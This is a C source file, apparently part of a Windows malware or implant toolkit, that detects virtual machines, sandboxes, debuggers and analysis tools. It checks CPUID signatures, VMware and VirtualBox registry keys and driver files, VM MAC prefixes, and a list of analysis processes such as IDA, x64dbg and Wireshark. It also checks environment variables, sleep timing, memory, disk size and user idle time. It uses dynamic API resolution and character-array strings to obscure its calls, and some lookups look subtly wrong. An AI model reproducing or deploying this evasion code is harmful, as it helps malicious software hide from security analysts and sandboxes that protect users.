#include "AntiSandbox.h"
#include "utils.h"
#include "ntdll.h"
#include <intrin.h>

// Known VM MAC prefixes
static const BYTE g_VMMacPrefixes[][3] = {
    { 0x00, 0x05, 0x69 }, // VMware
    { 0x00, 0x0C, 0x29 }, // VMware
    { 0x00, 0x1C, 0x14 }, // VMware
    { 0x00, 0x50, 0x56 }, // VMware
    { 0x08, 0x00, 0x27 }, // VirtualBox
    { 0x00, 0x21, 0xF6 }, // VirtualBox
    { 0x00, 0x15, 0x5D }, // Hyper-V
    { 0x00, 0x0F, 0x4B }, // Virtual Iron
    { 0x00, 0x16, 0x3E }, // Red Hat Xen
    { 0x00, 0x1A, 0x4A }, // Parallels
    { 0x00, 0x03, 0xFF }, // Microsoft
};

// Known sandbox/analysis processes
static const CHAR* g_SandboxProcesses[] = {
    "vmtoolsd.exe",
    "vmwaretray.exe",
    "vmwareuser.exe",
    "VGAuthService.exe",
    "vmms.exe",
    "VBoxService.exe",
    "VBoxTray.exe",
    "xenservice.exe",
    "qemu-ga.exe",
    "prl_tools.exe",
    "Parallels Service.exe",
    "wireshark.exe",
    "procmon.exe",
    "procmon64.exe",
    "procexp.exe",
    "procexp64.exe",
    "processhacker.exe",
    "autoruns.exe",
    "autoruns64.exe",
    "ollydbg.exe",
    "x64dbg.exe",
    "x32dbg.exe",
    "ida.exe",
    "ida64.exe",
    "idaq.exe",
    "idaq64.exe",
    "windbg.exe",
    "immunitydebugger.exe",
    "resourcehacker.exe",
    "pestudio.exe",
    "cff explorer.exe",
    "dependency walker.exe",
    "sysinternals",
    "apatedns.exe",
    "fakehttpserver.exe",
    "malwareanalysis.exe",
    "sniff_hit.exe",
    "sandman.exe",
    "sbiesvc.exe",
    "sbiectrl.exe",
    "anubis.exe",
    "joeboxserver.exe",
    "joeboxcontrol.exe",
    "joebox analyzer.exe",
    "ns.exe",
    NULL
};

// Known VM usernames
static const CHAR* g_VMUsernames[] = {
    "CurrentUser",
    "user",
    "malware",
    "sample",
    "virus",
    "sandbox",
    "analysis",
    "test",
    "vmware",
    "vbox",
    "virtual",
    NULL
};

// Check CPUID for VM indicators
BOOL CheckCPUFeatures() {
    int cpuInfo[4] = { 0 };

    // Check hypervisor presence (CPUID leaf 0x40000000)
    __cpuid(cpuInfo, 0x40000000);

    // If maximum hypervisor leaf > 0, we're in a VM
    if (cpuInfo[0] > 0) {
        return TRUE;
    }

    // Check for "Microsoft Hv" or "VMwareVMware" etc
    __cpuid(cpuInfo, 0);
    if (cpuInfo[1] == 0x68747541 || // Auth
        cpuInfo[3] == 0x69746E65) {  // enti
        // Check for known hypervisor signatures
        char vendor[13] = { 0 };
        memcpy(vendor, &cpuInfo[1], 4);
        memcpy(vendor + 4, &cpuInfo[3], 4);
        memcpy(vendor + 8, &cpuInfo[2], 4);

        // VMware
        if (StrCmpLowA(vendor, (char*)"vmwarevmware") == 0) return TRUE;
        // Microsoft Hyper-V
        if (StrCmpLowA(vendor, (char*)"microsoft hv") == 0) return TRUE;
        // KVM
        if (StrCmpLowA(vendor, (char*)"kvmkvmkvm") == 0) return TRUE;
        // VirtualBox
        if (StrCmpLowA(vendor, (char*)"vboxvboxvbox") == 0) return TRUE;
        // Xen
        if (StrCmpLowA(vendor, (char*)"xenxenxen") == 0) return TRUE;
    }

    return FALSE;
}

// Check for VMware specific artifacts
BOOL CheckVMware() {
    // Check registry
    typedef LONG(WINAPI* RegOpenKeyExA_t)(HKEY, LPCSTR, DWORD, REGSAM, PHKEY);
    typedef LONG(WINAPI* RegQueryValueExA_t)(HKEY, LPCSTR, LPDWORD, LPDWORD, LPBYTE, LPDWORD);
    typedef LONG(WINAPI* RegCloseKey_t)(HKEY);

    RegOpenKeyExA_t pRegOpenKeyExA = (RegOpenKeyExA_t)GetProcAddress(
        SysModules->Advapi32, "RegOpenKeyExA");
    RegQueryValueExA_t pRegQueryValueExA = (RegQueryValueExA_t)GetProcAddress(
        SysModules->Advapi32, "RegQueryValueExA");
    RegCloseKey_t pRegCloseKey = (RegCloseKey_t)GetProcAddress(
        SysModules->Advapi32, "RegCloseKey");

    if (pRegOpenKeyExA && pRegQueryValueExA && pRegCloseKey) {
        HKEY hKey = NULL;
        char keyPath[] = { 'S','Y','S','T','E','M','\\','C','u','r','r','e','n','t','C','o','n','t','r','o','l','S','e','t','\\','S','e','r','v','i','c','e','s','\\','v','m','t','o','o','l','s',0 };

        if (pRegOpenKeyExA(HKEY_LOCAL_MACHINE, keyPath, 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
            pRegCloseKey(hKey);
            return TRUE;
        }
    }

    // Check for VMware files
    char filePath[MAX_PATH];
    char systemDir[MAX_PATH];
    typedef UINT(WINAPI* GetSystemDirectoryA_t)(LPSTR, UINT);
    GetSystemDirectoryA_t pGetSystemDirectoryA = (GetSystemDirectoryA_t)GetProcAddress(
        SysModules->Kernel32, "GetSystemDirectoryA");

    if (pGetSystemDirectoryA) {
        pGetSystemDirectoryA(systemDir, MAX_PATH);

        // Check for vmtoolsd.exe
        typedef DWORD(WINAPI* GetFileAttributesA_t)(LPCSTR);
        GetFileAttributesA_t pGetFileAttributesA = (GetFileAttributesA_t)GetProcAddress(
            SysModules->Kernel32, "GetFileAttributesA");

        if (pGetFileAttributesA) {
            char vmFiles[][32] = {
                "drivers\\vmhgfs.sys",
                "drivers\\vmmemctl.sys",
                "drivers\\vmrawdsk.sys",
                "drivers\\vmusbmouse.sys"
            };

            for (int i = 0; i < 4; i++) {
                memcpy(filePath, systemDir, strlen(systemDir));
                filePath[strlen(systemDir)] = '\\';
                memcpy(filePath + strlen(systemDir) + 1, vmFiles[i], strlen(vmFiles[i]) + 1);

                if (pGetFileAttributesA(filePath) != INVALID_FILE_ATTRIBUTES) {
                    return TRUE;
                }
            }
        }
    }

    return FALSE;
}

// Check for VirtualBox
BOOL CheckVirtualBox() {
    // Check for VirtualBox drivers
    char systemDir[MAX_PATH];
    typedef UINT(WINAPI* GetSystemDirectoryA_t)(LPSTR, UINT);
    GetSystemDirectoryA_t pGetSystemDirectoryA = (GetSystemDirectoryA_t)GetProcAddress(
        SysModules->Kernel32, "GetSystemDirectoryA");
    typedef DWORD(WINAPI* GetFileAttributesA_t)(LPCSTR);
    GetFileAttributesA_t pGetFileAttributesA = (GetFileAttributesA_t)GetProcAddress(
        SysModules->Kernel32, "GetFileAttributesA");

    if (pGetSystemDirectoryA && pGetFileAttributesA) {
        pGetSystemDirectoryA(systemDir, MAX_PATH);

        char vboxFile[] = { 'd','r','i','v','e','r','s','\\','V','B','o','x','G','u','e','s','t','.','s','y','s',0 };
        char filePath[MAX_PATH];
        memcpy(filePath, systemDir, strlen(systemDir));
        filePath[strlen(systemDir)] = '\\';
        memcpy(filePath + strlen(systemDir) + 1, vboxFile, strlen(vboxFile) + 1);

        if (pGetFileAttributesA(filePath) != INVALID_FILE_ATTRIBUTES) {
            return TRUE;
        }
    }

    return FALSE;
}

// Check for Hyper-V
BOOL CheckHyperV() {
    // Check CPUID
    int cpuInfo[4] = { 0 };
    __cpuid(cpuInfo, 0x40000000);

    char signature[13] = { 0 };
    memcpy(signature, &cpuInfo[1], 4);
    memcpy(signature + 4, &cpuInfo[2], 4);
    memcpy(signature + 8, &cpuInfo[3], 4);

    // "Microsoft Hv"
    if (memcmp(signature, "Microsoft Hv", 12) == 0) {
        return TRUE;
    }

    return FALSE;
}

// Check for QEMU
BOOL CheckQEMU() {
    // QEMU often has specific hardware characteristics
    // Check for QEMU-specific drivers or files
    return FALSE;
}

// Check for KVM
BOOL CheckKVM() {
    int cpuInfo[4] = { 0 };
    __cpuid(cpuInfo, 0x40000000);

    char signature[13] = { 0 };
    memcpy(signature, &cpuInfo[1], 4);
    memcpy(signature + 4, &cpuInfo[2], 4);
    memcpy(signature + 8, &cpuInfo[3], 4);

    // "KVMKVMKVM"
    if (memcmp(signature, "KVMKVMKVM", 9) == 0) {
        return TRUE;
    }

    return FALSE;
}

// Check for Parallels
BOOL CheckParallels() {
    int cpuInfo[4] = { 0 };
    __cpuid(cpuInfo, 0x40000000);

    char signature[13] = { 0 };
    memcpy(signature, &cpuInfo[1], 4);
    memcpy(signature + 4, &cpuInfo[2], 4);
    memcpy(signature + 8, &cpuInfo[3], 4);

    // "Prll"
    if (memcmp(signature, "Prll", 4) == 0) {
        return TRUE;
    }

    return FALSE;
}

// Check for Xen
BOOL CheckXen() {
    int cpuInfo[4] = { 0 };
    __cpuid(cpuInfo, 0x40000000);

    char signature[13] = { 0 };
    memcpy(signature, &cpuInfo[1], 4);
    memcpy(signature + 4, &cpuInfo[2], 4);
    memcpy(signature + 8, &cpuInfo[3], 4);

    // "XenVMMXenVMM"
    if (memcmp(signature, "XenVMMXenVMM", 12) == 0) {
        return TRUE;
    }

    return FALSE;
}

// Check for WINE
BOOL CheckWine() {
    typedef HMODULE(WINAPI* LoadLibraryA_t)(LPCSTR);
    LoadLibraryA_t pLoadLibraryA = (LoadLibraryA_t)GetProcAddress(
        SysModules->Kernel32, "LoadLibraryA");

    if (pLoadLibraryA) {
        char ntdll[] = { 'n','t','d','l','l','.','d','l','l',0 };
        HMODULE hNtdll = pLoadLibraryA(ntdll);

        if (hNtdll) {
            typedef DWORD(WINAPI* wine_get_version_t)(void);
            wine_get_version_t pwine_get_version = (wine_get_version_t)GetProcAddress(
                hNtdll, "wine_get_version");

            if (pwine_get_version) {
                return TRUE;
            }
        }
    }

    return FALSE;
}

// Check sandbox environment variables
BOOL CheckSandboxEnvironment() {
    // Check for common sandbox indicators
    typedef LPVOID(WINAPI* GetEnvironmentStringsA_t)(void);
    GetEnvironmentStringsA_t pGetEnvironmentStringsA = (GetEnvironmentStringsA_t)GetProcAddress(
        SysModules->Kernel32, "GetEnvironmentStringsA");

    if (!pGetEnvironmentStringsA) return FALSE;

    char* env = (char*)pGetEnvironmentStringsA();
    if (!env) return FALSE;

    // Look for suspicious environment variables
    const char* suspiciousVars[] = {
        "SANDBOX",
        "VIRUS",
        "MALWARE",
        "SAMPLE",
        "ANALYSIS",
        "CUCKOO",
        "JOE",
        NULL
    };

    for (char* p = env; *p; p += strlen(p) + 1) {
        for (int i = 0; suspiciousVars[i]; i++) {
            if (StrCmpLowA(p, (char*)suspiciousVars[i]) == 0 ||
                strstr(p, suspiciousVars[i]) != NULL) {
                typedef BOOL(WINAPI* FreeEnvironmentStringsA_t)(LPSTR);
                FreeEnvironmentStringsA_t pFreeEnvironmentStringsA =
                    (FreeEnvironmentStringsA_t)GetProcAddress(SysModules->Kernel32, "FreeEnvironmentStringsA");
                if (pFreeEnvironmentStringsA) pFreeEnvironmentStringsA(env);
                return TRUE;
            }
        }
    }

    typedef BOOL(WINAPI* FreeEnvironmentStringsA_t)(LPSTR);
    FreeEnvironmentStringsA_t pFreeEnv = (FreeEnvironmentStringsA_t)GetProcAddress(
        SysModules->Kernel32, "FreeEnvironmentStringsA");
    if (pFreeEnv) pFreeEnv(env);

    return FALSE;
}

// Check for VM
BOOL CheckVM() {
    // Check CPU
    if (CheckCPUFeatures()) return TRUE;

    // Check specific VMs
    if (CheckVMware()) return TRUE;
    if (CheckVirtualBox()) return TRUE;
    if (CheckHyperV()) return TRUE;
    if (CheckKVM()) return TRUE;
    if (CheckXen()) return TRUE;
    if (CheckParallels()) return TRUE;
    if (CheckWine()) return TRUE;

    return FALSE;
}

// Check for analysis tools
BOOL CheckAnalysisTools() {
    // Check running processes
    typedef HANDLE(WINAPI* CreateToolhelp32Snapshot_t)(DWORD, DWORD);
    typedef BOOL(WINAPI* Process32FirstA_t)(HANDLE, LPPROCESSENTRY32);
    typedef BOOL(WINAPI* Process32NextA_t)(HANDLE, LPPROCESSENTRY32);

    CreateToolhelp32Snapshot_t pCreateToolhelp32Snapshot =
        (CreateToolhelp32Snapshot_t)GetProcAddress(SysModules->Kernel32, "CreateToolhelp32Snapshot");
    Process32FirstA_t pProcess32FirstA =
        (Process32FirstA_t)GetProcAddress(SysModules->Kernel32, "Process32FirstA");
    Process32NextA_t pProcess32NextA =
        (Process32NextA_t)GetProcAddress(SysModules->Kernel32, "Process32NextA");

    if (!pCreateToolhelp32Snapshot || !pProcess32FirstA || !pProcess32NextA) {
        return FALSE;
    }

    HANDLE hSnapshot = pCreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) return FALSE;

    PROCESSENTRY32 pe = { sizeof(PROCESSENTRY32) };
    BOOL found = FALSE;

    if (pProcess32FirstA(hSnapshot, &pe)) {
        do {
            for (int i = 0; g_SandboxProcesses[i]; i++) {
                if (StrCmpLowA(pe.szExeFile, (char*)g_SandboxProcesses[i]) == 0) {
                    found = TRUE;
                    break;
                }
            }
        } while (!found && pProcess32NextA(hSnapshot, &pe));
    }

    ApiNt->NtClose(hSnapshot);
    return found;
}

// Timing-based sandbox check
BOOL CheckTimingSandbox() {
    // Sandboxes often have accelerated time
    DWORD start = ApiWin->GetTickCount();
    ApiWin->Sleep(1000);
    DWORD elapsed = ApiWin->GetTickCount() - start;

    // If sleep took significantly less than expected, we're in a sandbox
    return elapsed < 900;
}

// Check hardware VM indicators
BOOL CheckHardwareVM() {
    return CheckCPUFeatures();
}

// Check network for sandbox
BOOL CheckNetworkSandbox() {
    // Check MAC address
    // This requires iphlpapi which we have
    PIP_ADAPTER_INFO pAdapterInfo = NULL;
    ULONG size = 0;

    if (ApiWin->GetAdaptersInfo(NULL, &size) != ERROR_BUFFER_OVERFLOW) {
        return FALSE;
    }

    pAdapterInfo = (PIP_ADAPTER_INFO)MemAllocLocal(size);
    if (!pAdapterInfo) return FALSE;

    if (ApiWin->GetAdaptersInfo(pAdapterInfo, &size) == NO_ERROR) {
        PIP_ADAPTER_INFO pAdapter = pAdapterInfo;
        while (pAdapter) {
            // Check MAC against known VM prefixes
            for (int i = 0; i < sizeof(g_VMMacPrefixes) / 3; i++) {
                if (memcmp(pAdapter->Address, g_VMMacPrefixes[i], 3) == 0) {
                    MemFreeLocal((LPVOID*)&pAdapterInfo, size);
                    return TRUE;
                }
            }
            pAdapter = pAdapter->Next;
        }
    }

    MemFreeLocal((LPVOID*)&pAdapterInfo, size);
    return FALSE;
}

// Check memory for sandbox
BOOL CheckMemorySandbox() {
    // Check available physical memory
    MEMORYSTATUSEX memStatus = { sizeof(MEMORYSTATUSEX) };

    typedef BOOL(WINAPI* GlobalMemoryStatusEx_t)(LPMEMORYSTATUSEX);
    GlobalMemoryStatusEx_t pGlobalMemoryStatusEx = (GlobalMemoryStatusEx_t)GetProcAddress(
        SysModules->Kernel32, "GlobalMemoryStatusEx");

    if (pGlobalMemoryStatusEx) {
        pGlobalMemoryStatusEx(&memStatus);

        // Less than 1GB of total physical memory is suspicious
        if (memStatus.ullTotalPhys < 1024ULL * 1024ULL * 1024ULL) {
            return TRUE;
        }
    }

    return FALSE;
}

// Check for sandbox processes
BOOL CheckSandboxProcesses() {
    return CheckAnalysisTools();
}

// Check user activity
BOOL CheckUserActivity() {
    LASTINPUTINFO lii = { sizeof(LASTINPUTINFO) };

    typedef BOOL(WINAPI* GetLastInputInfo_t)(PLASTINPUTINFO);
    GetLastInputInfo_t pGetLastInputInfo = (GetLastInputInfo_t)GetProcAddress(
        SysModules->Kernel32, "GetLastInputInfo");

    if (pGetLastInputInfo) {
        pGetLastInputInfo(&lii);

        DWORD idleTime = ApiWin->GetTickCount() - lii.dwTime;

        // More than 10 minutes idle is suspicious for a real user
        if (idleTime > 600000) {
            return TRUE;
        }
    }

    return FALSE;
}

// Check screen resolution
BOOL CheckScreenResolution() {
    typedef int(WINAPI* GetSystemMetrics_t)(int);
    GetSystemMetrics_t pGetSystemMetrics = (GetSystemMetrics_t)GetProcAddress(
        SysModules->Kernel32, "GetSystemMetrics");

    if (pGetSystemMetrics) {
        int width = pGetSystemMetrics(0);  // SM_CXSCREEN
        int height = pGetSystemMetrics(1); // SM_CYSCREEN

        // Very small resolution might indicate sandbox
        if (width < 800 || height < 600) {
            return TRUE;
        }
    }

    return FALSE;
}

// Check last input time
BOOL CheckLastInputTime(DWORD thresholdMs) {
    LASTINPUTINFO lii = { sizeof(LASTINPUTINFO) };

    typedef BOOL(WINAPI* GetLastInputInfo_t)(PLASTINPUTINFO);
    GetLastInputInfo_t pGetLastInputInfo = (GetLastInputInfo_t)GetProcAddress(
        SysModules->Kernel32, "GetLastInputInfo");

    if (pGetLastInputInfo) {
        pGetLastInputInfo(&lii);
        DWORD idleTime = ApiWin->GetTickCount() - lii.dwTime;
        return idleTime > thresholdMs;
    }

    return FALSE;
}

// Check disk size
BOOL CheckDiskSize(DWORD minSizeGB) {
    typedef BOOL(WINAPI* GetDiskFreeSpaceExA_t)(LPCSTR, PULARGE_INTEGER, PULARGE_INTEGER, PULARGE_INTEGER);
    GetDiskFreeSpaceExA_t pGetDiskFreeSpaceExA = (GetDiskFreeSpaceExA_t)GetProcAddress(
        SysModules->Kernel32, "GetDiskFreeSpaceExA");

    if (pGetDiskFreeSpaceExA) {
        ULARGE_INTEGER totalBytes = { 0 };
        pGetDiskFreeSpaceExA("C:\\", NULL, &totalBytes, NULL);

        ULONGLONG minBytes = (ULONGLONG)minSizeGB * 1024ULL * 1024ULL * 1024ULL;
        return totalBytes.QuadPart < minBytes;
    }

    return FALSE;
}

// Check CPU count
BOOL CheckCpuCount(DWORD minCpus) {
    typedef void(WINAPI* GetSystemInfo_t)(LPSYSTEM_INFO);
    GetSystemInfo_t pGetSystemInfo = (GetSystemInfo_t)GetProcAddress(
        SysModules->Kernel32, "GetSystemInfo");

    if (pGetSystemInfo) {
        SYSTEM_INFO si = { 0 };
        pGetSystemInfo(&si);
        return si.dwNumberOfProcessors < minCpus;
    }

    return FALSE;
}

// Check physical memory
BOOL CheckPhysicalMemory(DWORD minMemoryMB) {
    MEMORYSTATUSEX memStatus = { sizeof(MEMORYSTATUSEX) };

    typedef BOOL(WINAPI* GlobalMemoryStatusEx_t)(LPMEMORYSTATUSEX);
    GlobalMemoryStatusEx_t pGlobalMemoryStatusEx = (GlobalMemoryStatusEx_t)GetProcAddress(
        SysModules->Kernel32, "GlobalMemoryStatusEx");

    if (pGlobalMemoryStatusEx) {
        pGlobalMemoryStatusEx(&memStatus);

        ULONGLONG minBytes = (ULONGLONG)minMemoryMB * 1024ULL * 1024ULL;
        return memStatus.ullTotalPhys < minBytes;
    }

    return FALSE;
}

// Check sleep acceleration
BOOL CheckSleepAcceleration() {
    DWORD start = ApiWin->GetTickCount();
    ApiWin->Sleep(500);
    DWORD elapsed = ApiWin->GetTickCount() - start;

    // If sleep took significantly less than expected
    return elapsed < 400;
}

// Comprehensive sandbox check
BOOL CheckSandbox(DWORD checks, PSANDBOX_CHECK_RESULT pResult) {
    if (!pResult) return FALSE;

    memset(pResult, 0, sizeof(SANDBOX_CHECK_RESULT));

    BOOL detected = FALSE;

    if (checks & SANDBOX_CHECK_ENVIRONMENT) {
        if (CheckSandboxEnvironment()) {
            detected = TRUE;
            pResult->bSandboxDetected = TRUE;
            pResult->detectedMethods |= SANDBOX_CHECK_ENVIRONMENT;
        }
    }

    if (checks & SANDBOX_CHECK_VM) {
        if (CheckVM()) {
            detected = TRUE;
            pResult->bVMDetected = TRUE;
            pResult->detectedMethods |= SANDBOX_CHECK_VM;
        }
    }

    if (checks & SANDBOX_CHECK_ANALYSIS) {
        if (CheckAnalysisTools()) {
            detected = TRUE;
            pResult->bAnalysisDetected = TRUE;
            pResult->detectedMethods |= SANDBOX_CHECK_ANALYSIS;
        }
    }

    if (checks & SANDBOX_CHECK_TIMING) {
        if (CheckTimingSandbox()) {
            detected = TRUE;
            pResult->bSandboxDetected = TRUE;
            pResult->detectedMethods |= SANDBOX_CHECK_TIMING;
        }
    }

    if (checks & SANDBOX_CHECK_HARDWARE) {
        if (CheckHardwareVM()) {
            detected = TRUE;
            pResult->bVMDetected = TRUE;
            pResult->detectedMethods |= SANDBOX_CHECK_HARDWARE;
        }
    }

    if (checks & SANDBOX_CHECK_NETWORK) {
        if (CheckNetworkSandbox()) {
            detected = TRUE;
            pResult->bSandboxDetected = TRUE;
            pResult->detectedMethods |= SANDBOX_CHECK_NETWORK;
        }
    }

    if (checks & SANDBOX_CHECK_MEMORY) {
        if (CheckMemorySandbox()) {
            detected = TRUE;
            pResult->bSandboxDetected = TRUE;
            pResult->detectedMethods |= SANDBOX_CHECK_MEMORY;
        }
    }

    return detected;
}

// Simple sandbox check
BOOL IsSandbox() {
    SANDBOX_CHECK_RESULT result = { 0 };
    return CheckSandbox(SANDBOX_CHECK_ALL, &result);
}